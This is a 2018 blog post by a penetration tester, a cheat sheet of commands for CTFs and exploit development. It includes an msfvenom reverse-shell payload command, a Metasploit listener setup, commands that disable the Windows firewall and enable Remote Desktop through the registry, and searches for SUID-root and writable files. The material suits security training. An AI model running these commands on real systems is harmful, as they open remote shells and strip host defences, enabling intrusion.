---
layout: post
title: Useful commands (Linux, Windows, CTF, Exploit, etc...)
date: 2018-06-01 14:16:22.000000000 -03:00
type: post
parent_id: '0'
published: true
password: ''
status: publish
categories:
- Commands/Tips
- IT
tags: []
meta:
  _edit_last: '1'
  _yoast_wpseo_content_score: '60'
  _yoast_wpseo_primary_category: '25'
  _aviaLayoutBuilder_active: ''
  _aviaLayoutBuilderCleanData: ''
  layout: ''
  sidebar: ''
  footer: ''
  header_title_bar: ''
  header_transparency: ''
  _avia_hide_featured_image: '0'
  _syntaxhighlighter_encoded: '1'
  _av_alb_posts_elements_state: a:0:{}
  _av_el_mgr_version: '1.0'
  _av_alb_element_mgr_version: 1.0.1
  _av_css_styles: a:6:{s:7:"post_id";i:1758;s:8:"css_file";s:13:"post-1758.css";s:9:"timestamp";s:0:"";s:6:"status";s:6:"no_css";s:13:"processed_ids";a:0:{}s:13:"include_posts";a:0:{}}
author:
  login: helvio
  email: helvio_junior@hotmail.com
  display_name: Helvio Junior - M4v3r1ck - OSCE3 (OSEP + OSED + OSWE), OSCE, OSCP,
    eCXD, eMAPT, CEH
  first_name: Helvio
  last_name: Junior - M4v3r1ck - OSCE3 (OSEP + OSED + OSWE), OSCE, OSCP, eCXD, eMAPT,
    CEH
permalink: "/it/useful-commands-linux-windows-ctf-exploit-etc/"
---
<h2>General</h2>
<h3>Search commands</h3>
<p>Look for an text inside of file data</p>
<p>[sourcecode language="shell"]find / -type f -exec grep -Hn 'content_to_be_found' {} \;<br />
[/sourcecode]</p>
<p>Looking for writable files</p>
<p>[sourcecode language="shell"]find / -perm -2 ! -type l ! -path &quot;/proc*&quot; ! -path &quot;/sys*&quot; -ls 2&gt;/dev/null<br />
[/sourcecode]</p>
<p>&nbsp;</p>
<h2>Buffer Overflow</h2>
<h3>Looking for and possible vulnerable code</h3>
<p>[sourcecode language="shell"]find . -type f -exec grep -Hn 'strcpy' {} \;<br />
or<br />
find . -type f -exec grep -Hn 'strcpy' {} \; | awk -F'[:(,)]' '{print $1 &quot;:&quot; $2 &quot; ==&gt; &quot; $4 &quot;|&quot; $5 &quot;|&quot; $6}'<br />
[/sourcecode]</p>
<h3>Bad Characters</h3>
<p>[sourcecode language="shell"]badchars = (&quot;\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f&quot;<br />
&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;<br />
&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f&quot;<br />
&quot;\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f&quot;<br />
&quot;\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f&quot;<br />
&quot;\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf&quot;<br />
&quot;\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf&quot;<br />
&quot;\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;)<br />
[/sourcecode]</p>
<h3>Generating Payload</h3>
<p>Generating an payload to be used at python script avoiding some bad characters</p>
<p>[sourcecode language="shell"]msfvenom -p windows/shell_reverse_tcp LHOST=&lt;server_ip&gt; LPORT=&lt;server_port&gt; -b '\x00\x0a\x0d' -f python<br />
[/sourcecode]</p>
<h3>Decoding/printting an HEX Code</h3>
<p>[sourcecode language="shell"]echo &quot;41424344&quot; | xxd -r -p<br />
or<br />
cat hexfile.txt | sed 's/0x//g' | sed 's/,//g' | tr -d '\n' | xxd -r -p<br />
[/sourcecode]</p>
<h3>Listting all msfvenom payloads candidates and his Size</h3>
<p>[sourcecode language="shell"]for p in `msfvenom --list payloads | grep windows | awk '{print $1}'` ; do echo $p; msfvenom -p $p --list-options 2&gt;&amp;1 | grep -i &quot;total size&quot;; echo; done<br />
[/sourcecode]</p>
<h3>Generating 100 files with random content betwwen 1 and 10 MB</h3>
<p>[sourcecode language="shell"]<br />
for i in {1..100} ; do SIZE=$(( ( RANDOM % 10 )  + 1 )); FILENAME=$(cat /dev/urandom | tr -cd 'a-f0-9' | head -c 32); echo &quot;[$i - 100] Generating $SIZE file...&quot;; dd if=/dev/urandom of=sample_$FILENAME.txt bs=1M count=$SIZE; done<br />
[/sourcecode]</p>
<h3>Getting only binary opcode</h3>
<p>[sourcecode language="shell"]objdump -d mcat |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|paste -d '' -s |sed 's/^/&quot;/'|sed 's/$/&quot;/g' | sed 's/ /\\x/g'<br />
[/sourcecode]</p>
<p>&nbsp;</p>
<h2>Windows</h2>
<h3>Disabling Windows firewall</h3>
<p>[sourcecode language="shell"]netsh firewall opmode disable<br />
netsh advfirewall set allprofiles state off<br />
[/sourcecode]</p>
<h3>Enabling Remote Desktop Service</h3>
<p>[sourcecode language="shell"]reg add &quot;hklm\system\currentcontrolset\control\terminal server&quot; /f /v fDenyTSConnections /t REG_DWORD /d 0<br />
[/sourcecode]</p>
<pre></pre>
<p>&nbsp;</p>
<h2>Linux</h2>
<h3>Rdesktop with disk sharing</h3>
<p>[sourcecode language="shell"]rdesktop  -u user -p password server:port -r disk:test=/tmp/ -g 85% -x m<br />
[/sourcecode]</p>
<h3>Starting Metasploit Listener</h3>
<p>[sourcecode language="shell"]use exploit/multi/handler<br />
set PAYLOAD windows/meterpreter/reverse_tcp<br />
set LHOST 0.0.0.0<br />
set LPORT 4444<br />
set ExitOnSession false<br />
exploit -j -z<br />
[/sourcecode]</p>
<pre></pre>
<h3>Finding all root SUID files</h3>
<p>[sourcecode language="shell"]find / -perm +4000 -uid 0 2&gt;/dev/null<br />
[/sourcecode]</p>
<h3>Filtering wordlist by length and unique texts</h3>
<p>[sourcecode language="shell"]cat data.txt | awk '{if (length($0) &gt; 6 &amp;&amp; length($0) &lt;= 16) print tolower($0) }' | sort -u<br />
[/sourcecode]</p>
<p>&nbsp;</p>
